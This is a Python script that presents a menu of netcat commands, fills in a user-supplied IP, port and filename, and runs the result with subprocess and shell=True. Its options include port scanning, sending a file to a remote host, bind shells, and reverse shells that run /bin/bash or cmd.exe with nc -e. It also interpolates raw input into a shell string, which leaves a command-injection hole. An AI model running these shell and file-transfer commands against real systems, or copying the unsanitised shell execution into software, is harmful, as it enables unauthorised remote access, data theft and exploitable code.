import subprocess

def display_commands():
    commands = {
        "1": "Connect to a target IP and port.",
        "2": "Listen on a specified port.",
        "3": "Scan a range of ports on the target IP.",
        "4": "Listen on a port and send data from a file.",
        "5": "Connect to a target IP and port and save data to a file.",
        "6": "Listen on a port and write received data to a file.",
        "7": "Connect to a target IP and port and send data from a file.",
        "8": "Listen on a port and execute a bash shell.",
        "9": "Connect to local IP and port and execute a bash shell.",
        "10": "Listen on a port and execute cmd.exe on Windows.",
        "11": "Connect to local IP and port and execute cmd.exe on Windows."
    }

    print("Available netcat commands:")
    for key, description in commands.items():
        print(f"{key}: {description}")

def get_user_input(command_info):
    ip = input("Enter the target IP address: ")
    port = input("Enter the port number: ")
    filename = input("Enter filename (optional, press Enter to skip): ")

    return ip, port, filename

def build_command(choice, ip, port, filename):
    command_map = {
        "1": f"nc {ip} {port}",
        "2": f"nc -l -p {port}",
        "3": f"nc -v -n -z -w1 {ip} [startport]-[endport]",
        "4": f"nc -l -p {port} < {filename}" if filename else None,
        "5": f"nc -w3 {ip} {port} > {filename}" if filename else None,
        "6": f"nc -l -p {port} > {filename}" if filename else None,
        "7": f"nc -w3 {ip} {port} < {filename}" if filename else None,
        "8": f"nc -l -p {port} -e /bin/bash",
        "9": f"nc {ip} {port} -e /bin/bash",
        "10": f"nc -l -p {port} -e cmd.exe",
        "11": f"nc {ip} {port} -e cmd.exe"
    }

    return command_map.get(choice)

def main():
    display_commands()
    
    choice = input("Select a command (1-11): ")

    # Validate the chosen command
    if choice not in map(str, range(1, 12)):
        print("Invalid selection. Please choose a number between 1 and 11.")
        return

    ip, port, filename = get_user_input(choice)

    # Build the command based on user inputs
    command_to_execute = build_command(choice, ip, port, filename)

    if command_to_execute is None:
        print("This command requires a filename.")
        return

    print(f"\nCommand to execute:\n{command_to_execute}")

    # Confirm with the user before executing
    confirm = input("Do you want to execute this command? (yes/no): ")
    if confirm.lower() == 'yes':
        try:
            # Execute the command
            subprocess.run(command_to_execute, shell=True)
        except Exception as e:
            print(f"An error occurred: {e}")
    else:
        print("Command execution cancelled.")

if __name__ == "__main__":
    main()
